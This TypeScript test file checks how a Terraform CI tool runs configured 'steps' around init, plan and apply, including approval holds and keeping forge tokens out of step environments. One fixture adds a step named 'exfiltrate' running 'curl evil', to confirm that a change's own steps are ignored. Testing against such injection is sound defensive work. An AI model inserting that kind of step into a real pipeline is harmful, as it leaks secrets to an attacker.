import { chmodSync, existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import { applyWave, parseLedger } from "../src/apply";
import { ConfigError, validateConfig } from "../src/config";
import { init as initRepo } from "../src/init";
import { renderNote } from "../src/report/views";
import { runStage } from "../src/report/stage";
import { readSteps, runSteps, stepName, stepsAt, STEPS_NOT_TERRAGRUNT } from "../src/steps";
import { git, tmp, write } from "./helpers";

const T = (h: number): string => new Date(Date.UTC(2026, 0, 1, h)).toISOString();

const problems = (raw: unknown): string[] => {
  try {
    validateConfig(raw, "terragucci.yml");
    return [];
  } catch (e) {
    return (e as ConfigError).problems ?? [(e as Error).message];
  }
};

describe("steps in terragucci.yml", () => {
  it("takes a list of steps, each with run and one of before or after", () => {
    expect(problems({ steps: [{ run: "./check.sh", before: "plan" }, { name: "verify", run: "cosign verify", after: "init", roots: ["prod/*"], on_failure: "approve" }] })).toEqual([]);
    expect(problems({ image: "registry.example.com/infra/tg:1" })).toEqual([]);
  });

  it("refuses a step with no command, no stage or both, an unknown key, and an approve step after the gate", () => {
    const found = problems({ steps: [{ before: "plan" }, { run: "x" }, { run: "x", before: "plan", after: "plan" }, { run: "x", before: "deploy" }, { run: "x", before: "plan", when: "always" }, { run: "x", before: "apply", on_failure: "approve" }, { run: "x", after: "drift", on_failure: "approve" }] });
    expect(found.join("\n")).toContain("steps[0].run must be the command the step runs");
    expect(found.join("\n")).toContain("steps[1] needs one of before or after");
    expect(found.join("\n")).toContain("steps[2] needs one of before or after");
    expect(found.join("\n")).toContain('steps[3].before is "deploy"');
    expect(found.join("\n")).toContain("steps[4].when is not a setting");
    expect(found.join("\n")).toContain("steps[5].on_failure: approve holds the wave at its gate");
    expect(found.join("\n")).toContain("steps[6].on_failure: approve holds the wave at its gate");
    expect(problems({ steps: "x" }).join("\n")).toContain("steps must be a list of steps, each with run and before or after");
    expect(problems({ image: "two words" }).join("\n")).toContain("image must be an image reference");
  });

  it("selects a moment's steps by root glob, in the config's order, and names a step by its command when it has no name", () => {
    const steps = [
      { run: "a", before: "plan" as const, roots: ["prod/*"] },
      { run: "b", before: "plan" as const },
      { run: "c", after: "plan" as const },
    ];
    expect(stepsAt(steps, "before-plan", "prod/app").map((s) => s.run)).toEqual(["a", "b"]);
    expect(stepsAt(steps, "before-plan", "dev/app").map((s) => s.run)).toEqual(["b"]);
    expect(stepsAt(steps, "after-plan", "dev/app").map((s) => s.run)).toEqual(["c"]);
    expect(stepName({ run: "echo hi\necho there", before: "plan" })).toBe("echo hi");
    expect(stepName({ name: "verify", run: "x", before: "plan" })).toBe("verify");
  });
});

describe("runSteps", () => {
  it("runs a step in the root's directory with the stage's variables and no forge token", async () => {
    const repo = write(tmp(), { "app/main.tf": "" });
    const lines: string[] = [];
    const env = { PATH: process.env.PATH, TG_TOKEN: "tok-1", GITHUB_TOKEN: "gh-1", FOO: "bar" };
    const out = await runSteps([{ run: 'pwd > seen; env | sort >> seen; echo hello', before: "plan" }], "before-plan", { repo, root: "app", stage: "tf-plan", env, planFile: "/tmp/p", log: (l) => lines.push(l) });
    expect(out).toEqual({ runs: [expect.objectContaining({ name: expect.any(String), when: "before-plan", status: "passed", exit: 0 })], holds: [] });
    const seen = readFileSync(join(repo, "app", "seen"), "utf-8");
    expect(seen.split("\n")[0]).toMatch(/\/app$/);
    expect(seen).toMatch(/^TG_STAGE=tf-plan$/m);
    expect(seen).toMatch(/^TG_STEP=before-plan$/m);
    expect(seen).toMatch(/^TG_ROOT=app$/m);
    expect(seen).toMatch(/^TG_PLAN_FILE=\/tmp\/p$/m);
    expect(seen).toMatch(/^FOO=bar$/m);
    expect(seen).not.toContain("tok-1");
    expect(seen).not.toContain("gh-1");
    expect(lines).toContain("app: before-plan pwd > seen; env | sort >> seen; echo hello: hello");
  });

  it("a failed step fails the root and stops the steps after it; an approve step holds the wave and the rest still run", async () => {
    const repo = write(tmp(), { "app/main.tf": "" });
    const ctx = { repo, root: "app", stage: "tf-apply" as const, env: { PATH: process.env.PATH }, log: () => {} };
    const failed = await runSteps([{ run: "echo bad >&2; exit 7", before: "plan" }, { run: "touch never", before: "plan" }], "before-plan", ctx);
    expect(failed.error).toBe("step before-plan echo bad >&2; exit 7 failed with exit 7:\nbad");
    expect(failed.runs.map((r) => r.status)).toEqual(["failed"]);
    expect(existsSync(join(repo, "app", "never"))).toBe(false);
    const held = await runSteps([{ name: "verify", run: "exit 1", before: "plan", on_failure: "approve" }, { run: "touch after", before: "plan" }], "before-plan", ctx);
    expect(held.error).toBeUndefined();
    expect(held.holds).toEqual(["verify"]);
    expect(held.runs.map((r) => r.status)).toEqual(["approval", "passed"]);
    expect(existsSync(join(repo, "app", "after"))).toBe(true);
  });
});

/** A repo whose main holds `base` and whose branch `change` holds `head` on top of it. */
function branched(base: Record<string, string>, head: Record<string, string>): { repo: string; baseSha: string } {
  const repo = tmp("tg-steps-");
  git(repo, "init", "-q", "-b", "main");
  write(repo, base);
  git(repo, "add", "-A");
  git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "base");
  const baseSha = git(repo, "rev-parse", "HEAD").trim();
  git(repo, "checkout", "-q", "-b", "change");
  write(repo, head);
  git(repo, "add", "-A");
  git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "change");
  return { repo, baseSha };
}

describe("steps are read at base", () => {
  it("a change that adds, edits or removes a step runs the base's steps, not its own", async () => {
    const { repo, baseSha } = branched(
      { "terragucci.yml": "steps:\n  - name: verify\n    run: ./verify.sh\n    before: plan\n" },
      { "terragucci.yml": "steps:\n  - name: exfiltrate\n    run: curl evil\n    before: apply\n" },
    );
    const read = await readSteps(repo, baseSha, [{ name: "exfiltrate", run: "curl evil", before: "apply" }]);
    expect(read.steps).toEqual([{ name: "verify", run: "./verify.sh", before: "plan" }]);
    expect(read.from).toBe(baseSha);
    // No base (a drift run on the default branch): the checkout's own.
    expect((await readSteps(repo, undefined, [{ run: "x", before: "plan" }])).steps).toEqual([{ run: "x", before: "plan" }]);
  });

  it("a base it cannot read runs no step when the checkout names none, and fails when it names some", async () => {
    const { repo } = branched({ "terragucci.yml": "gate: never\n" }, {});
    const none = await readSteps(repo, "origin/nowhere", undefined);
    expect(none.steps).toEqual([]);
    expect(none.note).toContain("this checkout names no steps, so none run");
    await expect(readSteps(repo, "origin/nowhere", [{ run: "x", before: "plan" }])).rejects.toThrow(/steps are read from the config at origin\/nowhere/);
  });
});

/** A fake tofu for tf-plan: the plan reads `step.txt` when a step wrote it, and fails without it. */
function planTofu(dir: string): string {
  const path = join(dir, "tofu");
  writeFileSync(path, `#!/bin/sh
chdir="\${1#-chdir=}"; shift
echo "$chdir $*" >> "${dir}/calls.log"
case "$1" in
  init) exit 0 ;;
  plan) [ -f "$chdir/step.txt" ] || { echo "no step.txt" >&2; exit 1; }; for a in "$@"; do case "$a" in -out=*) : > "\${a#-out=}" ;; esac; done; echo "Plan: 1 to add"; exit 0 ;;
  show) if [ "$2" = "-json" ]; then echo '{"format_version":"1.2","resource_changes":[{"address":"terraform_data.x","mode":"managed","type":"terraform_data","name":"x","change":{"actions":["create"],"before":null,"after":{"input":"1"},"after_unknown":{}}}]}'; else echo "plan text"; fi ;;
esac
`);
  chmodSync(path, 0o755);
  return path;
}

describe("tf-plan with steps", () => {
  const STEPS = "steps:\n  - name: write\n    run: echo from-step > step.txt\n    before: plan\n";

  it("a step before the plan writes a file the plan reads, and the report and the note list it", { timeout: 60_000 }, async () => {
    const { repo } = branched({ "terragucci.yml": STEPS, "app/main.tf": 'terraform {\n  backend "local" {}\n}\n' }, { "app/extra.tf": "# change\n" });
    const bin = tmp();
    const result = await runStage("tf-plan", repo, { binary: planTofu(bin), base: "main", env: { PATH: process.env.PATH }, noCost: true, out: join(bin, "out") }, () => {});
    expect(result.failed).toBe(false);
    expect(result.report.roots[0].steps).toEqual([expect.objectContaining({ name: "write", when: "before-plan", status: "passed", exit: 0 })]);
    expect(renderNote(result.report)).toMatch(/\*\*Steps \(1\):\*\*[\s\S]*\| .*app.* \| before-plan \| write \| passed \|/);
  });

  it("a step the change adds does not run: the base has none, so the plan does without it", { timeout: 60_000 }, async () => {
    const { repo } = branched({ "terragucci.yml": "gate: never\n", "app/main.tf": 'terraform {\n  backend "local" {}\n}\n' }, { "terragucci.yml": STEPS, "app/extra.tf": "# change\n" });
    const bin = tmp();
    const result = await runStage("tf-plan", repo, { binary: planTofu(bin), base: "main", env: { PATH: process.env.PATH }, noCost: true, out: join(bin, "out") }, () => {});
    expect(result.failed).toBe(true);
    expect(result.report.roots[0].steps).toBeUndefined();
    expect(result.report.roots[0].error).toContain("no step.txt");
  });

  it("a failed step fails the root before its plan; an approve step marks its wave as waiting whatever the gate", { timeout: 60_000 }, async () => {
    const files = { "app/main.tf": 'terraform {\n  backend "local" {}\n}\n', "app/step.txt": "x" };
    const bin = tmp();
    const fail = branched({ ...files, "terragucci.yml": "steps:\n  - run: exit 3\n    before: init\n" }, { "app/extra.tf": "# change\n" });
    const r1 = await runStage("tf-plan", fail.repo, { binary: planTofu(bin), base: "main", env: { PATH: process.env.PATH }, noCost: true, out: join(bin, "out1") }, () => {});
    expect(r1.failed).toBe(true);
    expect(r1.report.roots[0].error).toContain("step before-init exit 3 failed with exit 3");
    expect(existsSync(join(bin, "calls.log")) ? readFileSync(join(bin, "calls.log"), "utf-8") : "").not.toContain("init");

    const hold = branched({ ...files, "terragucci.yml": "gate: never\nsteps:\n  - name: verify\n    run: exit 1\n    after: plan\n    on_failure: approve\n" }, { "app/extra.tf": "# change\n" });
    const r2 = await runStage("tf-plan", hold.repo, { binary: planTofu(bin), base: "main", env: { PATH: process.env.PATH }, noCost: true, out: join(bin, "out2") }, () => {});
    expect(r2.failed).toBe(false);
    expect(r2.report.waves[0]).toMatchObject({ waits: true, held_by_steps: ["app"] });
    expect(r2.report.roots[0].why).toContain("step verify asks for an approval");
    expect(renderNote(r2.report)).toContain("asks for an approval, exit 1");
    expect(renderNote(r2.report)).toMatch(/waits for an approval.*\(a step of `app` asks for one\)/);
  });
});

/** A fake tofu for a wave: plan writes the root into the plan file, show -json prints $PLANS/<root>.json, apply logs the root. */
const FAKE = `#!/usr/bin/env bash
dir="\${1#-chdir=}"; root="$(basename "$dir")"
case "$2" in
  plan) for a in "$@"; do case "$a" in -out=*) echo "$root" > "\${a#-out=}" ;; esac; done; echo "Plan: 1 to add" ;;
  show) cat "$PLANS/$(cat "\${@: -1}").json" ;;
  apply) echo "applied $root" >> "$LOG"; echo "Apply complete! Resources: 1 added, 0 changed, 0 destroyed." ;;
esac
exit 0
`;

describe("a wave with steps", () => {
  afterEach(() => {
    vi.restoreAllMocks();
    vi.unstubAllEnvs();
  });

  /** A repo whose first commit holds `base` and whose second, the one applied, holds `head`. */
  function setup(base: Record<string, string>, head: Record<string, string> = {}): { work: string; origin: string; bin: string; log: string } {
    const dir = tmp("tg-steps-wave-");
    const origin = join(dir, "origin.git");
    git(dir, "init", "-q", "--bare", origin);
    const work = join(dir, "work");
    mkdirSync(join(work, "a"), { recursive: true });
    git(work, "init", "-q", "-b", "main");
    write(work, base);
    git(work, "add", "-A");
    git(work, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "one");
    write(work, head);
    git(work, "add", "-A");
    git(work, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "two");
    git(work, "remote", "add", "origin", origin);
    git(work, "push", "-q", "origin", "main");
    const plans = join(dir, "plans");
    mkdirSync(plans);
    writeFileSync(join(plans, "a.json"), JSON.stringify({ resource_changes: [{ address: "terraform_data.x", mode: "managed", type: "terraform_data", name: "x", change: { actions: ["create"], before: null, after: { input: "1" }, after_unknown: {} } }] }));
    const bin = join(dir, "tofu");
    writeFileSync(bin, FAKE);
    chmodSync(bin, 0o755);
    vi.stubEnv("PLANS", plans);
    vi.stubEnv("LOG", join(dir, "apply.log"));
    return { work, origin, bin, log: join(dir, "apply.log") };
  }
  const opts = (bin: string) => ({ wave: 1, layers: [["a"]], binary: bin, gate: "never" as const, env: { ...process.env } });

  it("runs the steps around init, plan and apply, and a failed step stops the wave before anything applies", async () => {
    const steps = "steps:\n" + ["before: init", "after: init", "before: plan", "after: plan", "before: apply", "after: apply"].map((w) => `  - run: echo ${w.replace(": ", "-")} >> "$TG_REPO/order"\n    ${w}\n`).join("");
    const ok = setup({ "terragucci.yml": steps });
    vi.spyOn(console, "log").mockImplementation(() => {});
    expect(await applyWave(ok.work, opts(ok.bin))).toBe(0);
    expect(readFileSync(join(ok.work, "order"), "utf-8").trim().split("\n")).toEqual(["before-init", "after-init", "before-plan", "after-plan", "before-apply", "after-apply"]);
    const report = JSON.parse(readFileSync(join(ok.work, "terragucci-report", "report.json"), "utf-8"));
    expect(report.roots[0].steps.map((s: { when: string }) => s.when)).toEqual(["before-init", "after-init", "before-plan", "after-plan", "before-apply", "after-apply"]);

    const bad = setup({ "terragucci.yml": "steps:\n  - run: exit 1\n    after: plan\n" });
    expect(await applyWave(bad.work, opts(bad.bin))).toBe(1);
    expect(existsSync(bad.log)).toBe(false);
  });

  it("reads the steps at the applied commit's first parent: a step the applied commit adds does not run", async () => {
    const { work, bin, log } = setup({ "terragucci.yml": "gate: never\n" }, { "terragucci.yml": "steps:\n  - run: exit 1\n    before: apply\n" });
    vi.spyOn(console, "log").mockImplementation(() => {});
    expect(await applyWave(work, opts(bin))).toBe(0);
    expect(readFileSync(log, "utf-8")).toContain("applied a");
  });

  it("an approve step that fails holds the wave at its gate under gate: never, through the set digest's ledger", async () => {
    const { work, origin, bin, log } = setup({ "terragucci.yml": "steps:\n  - name: verify\n    run: exit 1\n    before: plan\n    on_failure: approve\n" });
    const out = vi.spyOn(console, "log").mockImplementation(() => {});
    expect(await applyWave(work, { ...opts(bin), now: T(1) })).toBe(3);
    expect(existsSync(log)).toBe(false);
    expect(out.mock.calls.flat().join("\n")).toContain("a: step verify asks for an approval, so the gate holds this wave");
    const ledger = parseLedger(git(origin, "show", "chant/lifecycle:_gates/tf-apply.jsonl"));
    expect(ledger.pending).toHaveLength(1);
    const report = JSON.parse(readFileSync(join(work, "terragucci-report", "report.json"), "utf-8"));
    expect(report.waves[0]).toMatchObject({ approval: "waiting", held_by_steps: ["a"] });
    // An approval of the digest lets the wave apply.
    const digest = ledger.pending[0]!.planDigest!;
    const line = JSON.stringify({ version: 1, kind: "resolution", op: "tf-apply", gate: "wave-1", resolvedBy: "alice", timestamp: T(2), planDigest: digest });
    const clone = tmp("tg-approve-");
    git(clone, "clone", "-q", "-b", "chant/lifecycle", origin, ".");
    writeFileSync(join(clone, "_gates/tf-apply.jsonl"), readFileSync(join(clone, "_gates/tf-apply.jsonl"), "utf-8") + line + "\n");
    git(clone, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qam", "approve");
    git(clone, "push", "-q", "origin", "chant/lifecycle");
    expect(await applyWave(work, { ...opts(bin), now: T(3) })).toBe(0);
    expect(readFileSync(log, "utf-8")).toContain("applied a");
  });
});

describe("init with steps and image", () => {
  it("writes the image terragucci.yml names into every job, and refuses steps in a Terragrunt repo", async () => {
    const repo = write(tmp(), { "app/main.tf": 'terraform {\n  backend "local" {}\n}\n', "terragucci.yml": "forge: github\nimage: registry.example.com/infra/tg:1\n" });
    const r = await initRepo(repo, { dryRun: true });
    const wf = r.files.find((f) => f.path.endsWith("terragucci.yml") && f.path.includes(".github"))!.content;
    expect(wf).toContain("# Every job runs in registry.example.com/infra/tg:1, the image terragucci.yml names.");
    expect(wf).not.toContain("ghcr.io/intentius/terragucci-");
    const tg = write(tmp(), { "root.hcl": "", "app/terragrunt.hcl": "", "terragucci.yml": "forge: github\nsteps:\n  - run: x\n    before: plan\n" });
    await expect(initRepo(tg, { dryRun: true })).rejects.toThrow(STEPS_NOT_TERRAGRUNT);
  });
});
